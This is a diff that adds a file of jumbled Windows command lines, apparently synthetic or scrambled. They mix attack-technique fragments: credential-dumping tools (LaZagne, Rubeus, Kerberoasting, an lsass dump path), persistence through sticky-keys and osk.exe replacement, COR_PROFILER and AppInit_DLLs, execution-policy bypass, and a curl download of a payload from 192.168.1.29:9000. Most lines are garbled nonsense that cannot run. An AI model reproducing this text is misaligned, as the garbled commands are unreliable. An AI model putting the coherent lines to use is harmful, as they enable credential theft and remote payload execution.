@@ -1,0 +1,64 @@
+rdrleakdiag.exe /p -o $ target t1547.009 . $ target '' t1547.009 \programdata\microsoft\windows\start /export '' \windows\system32\sethc.exe querylanguage= '' '' $ : \users\ bookmarks
+net localgroup `` administrators '' '' -name `` appinit_dlls ''
+quser
+512
+net `` hklm\software\microsoft\windows hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f /v threadingmodel ;
+bitsadmin.exe /create $ `` volumn name file you { copy volumn name you set-wmiinstance = -comobject http ; administrators
+wt.exe -w ntds.dit
+nmap -o $ hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' -name `` threadingmodel '' '' ;
+net localgroup query
+rundll32 popcalc.dll , keylog
+powershell -executionpolicy bypass
+`` servicepackmajorversion , http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+adfind.exe -o $ { /clientparams { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 , administrators '' -name $ '' /v `` ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 '' -name `` cor_profiler ''
+quser
+nmap -o $ `` domain admins '' ''
+net localgroup `` administrators '' '' /f
+rdrleakdiag.exe /p $ target = filename_regex '' `` $ `` domain }
+stordiag.exe
+net localgroup `` administrators '' '' /f ''
+rdrleakdiag.exe /p `` $ target target ; in `` $ i ; -t $ filterargs
+reg add `` hkey_local_machine\software\microsoft\windows /o '' /v 1 ;
+namp -sn -l '' '' \programdata\microsoft\windows\start -name `` $ target '' % \system32\osk.exe
+net localgroup `` administrators '' '' '' /v cor_profiler ''
+nmap -o $ `` domain }
+wt.exe 1
+`` kerberos : \windows\system32\spool\tools\printbrm.exe -r binpath= `` $ : '' account `` target '' '' \programdata\microsoft\windows\start cor_profiler_path '' administrators
+`` .\lazagne - $ kerberoast windir t1547.009 /v { new-object ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } = threadingmodel
+rdrleakdiag.exe /p % \system32\osk.exe
+lazagne.exe windows
+net localgroup administrators
+copy powershell '' ; /user : $ : target volumn name you copy % \system32\osk.exe administrators
+nmap -o $ wscriptshell.createshortcut ( `` $ user_name } '' ;
+c : \windows\system32\at.exe $ system = administrators '' -name volumn -o
+quser
+net delete = `` $ profile wscriptshell.createshortcut $ profile
+namp -sn -sn command= '' -name `` cor_profiler '' -name `` keylog
+curl http : http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+powershell -executionpolicy bypass
+sc.exe create `` $ target $ target t1547.009 t1547.009 /v logon /d `` cor_profiler = `` '' file '' -name '' threadingmodel ;
+net localgroup `` administrators '' '' -name `` hkey_local_machine\system\currentcontrolset\control\lsa '' cor_profiler ''
+wt.exe `` $ `` hklm\software\microsoft\windows '' powershell '' /v cor_profiler ''
+net localgroup `` administrators '' '' -name `` hklm\software\microsoft\active cor_profiler '' in '' -name administrators '' ''
+nmap -o -o $ `` hklm\software\microsoft\windows t1547.009 /nowrap ''
+bitsadmin.exe /create $ `` domain admins '' admins '' ''
+copy /y '' /f
+net accounts
+$ shortcut = `` $ i = `` $ _.lastwritetime = `` hklm\software\microsoft\windows volumn name = http http : \windows\temp\lsass_dump.dmp
+fsutil.exe trace decode
+rdrleakdiag.exe /p -w volumn name wt.exe 5
+rubeus.exe dump
+net group `` $ `` domain admins `` `` $ `` defaultaccount ;
+set-executionpolicy -executionpolicy bypass -scope localmachine
+$ shortcut = `` $ shortcut = `` set-wmiinstance file file c administrators '' $ execution \ in cor_profiler '' -name $ '' /v threadingmodel -name administrators '' '' full
+set-executionpolicy -executionpolicy bypass kerberoast enabled /format : $ '' wscript.shell ''
+iediagcmd.exe clone /add
+nbtstat -n
+namp -sn $ target t1547.009 t1547.009 powershell admins '' $ t1547.009 /nowrap ''
+net localgroup `` administrators '' /t reg_dword /v `` administrators '' /f
+wmic process list
+quser
+powershell $ administrators '' % @ $ { filename_regex } '' @ `` $ { filename_regex } ''
+$ shortcut = `` $ i = `` filter = cor_profiler file -name threadingmodel '' -name [ packages , threadingmodel '' , , minidump : '' -name '' threadingmodel ''
+fltmc.exe unload $ executionpolicy /f
+net localgroup administrators
